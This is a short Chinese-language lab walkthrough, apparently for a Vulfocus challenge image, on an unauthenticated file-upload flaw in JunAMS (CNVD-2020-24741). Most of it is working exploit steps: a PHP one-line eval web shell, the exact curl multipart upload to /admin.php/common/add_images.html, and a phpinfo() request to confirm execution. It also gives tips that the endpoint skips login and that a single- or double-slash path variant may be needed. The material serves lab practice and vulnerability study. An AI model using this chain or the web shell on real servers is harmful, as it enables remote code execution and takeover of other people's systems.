# junams 文件上传（CNVD-2020-24741）

- 题库镜像：`vulfocus/junams-cnvd_2020_24741:latest`
- 公开复现/代码分析版本：JunAMS `1.2.1.20190403`。[S1][S2]
- 内部端口：HTTP `80`（题库另列 `3306`，本链路走 HTTP）
- 一句话打法：向 `/admin.php/common/add_images.html` 发送 multipart 上传请求；该处理逻辑对非图片扩展名未执行图片校验，上传 PHP 文件后按响应给出的路径访问验证执行。[S1][S2]

## 操作步骤

1. 准备 `poc.php`，内容使用复现文章中的 `<?php eval($_REQUEST[1]); ?>`。[S1]
2. 对目标 HTTP 映射端口发送 multipart 请求，字段名为 `file`：

   ```powershell
   curl.exe -i -F "file=@poc.php" "http://<靶场地址>:<映射端口>//admin.php/common/add_images.html"
   ```

   接口可直接访问，不必先登录后台。[S1][S2] 上传接口路径在公开复现中有单斜杠和双斜杠两种写法；若当前写法返回路由错误，按来源所示换另一种写法。[S1][S3]
3. 从响应中取上传文件路径（复现响应字段为 `data.src`），访问该路径并附上 `?1=phpinfo();`。出现 PHPInfo 页面即为复现文章给出的成功信号；不要预设日期目录或生成文件名。[S1][S2]

## 本题特有排坑

- 后台页面需要登录的现象不等于上传接口需要认证：公开分析指出漏洞接口未受后台认证拦截，直接 POST 可跳过登录；Vulfocus 手工复现文章里的 `admin/admin` 是进入后台页面的方式，不是漏洞链前提。[S1][S2][S3]
- 路径斜杠写法不一致：复现 PoC 使用 `//admin.php/...`，Vulfocus 文章的表单路径为 `/admin.php/...`；以实际响应为准，不要把某种斜杠形式写死。[S1][S3]
- 上传保存位置含日期/随机文件名，应使用接口响应返回的路径，不要照抄他人环境的文件 URL。[S1][S2]
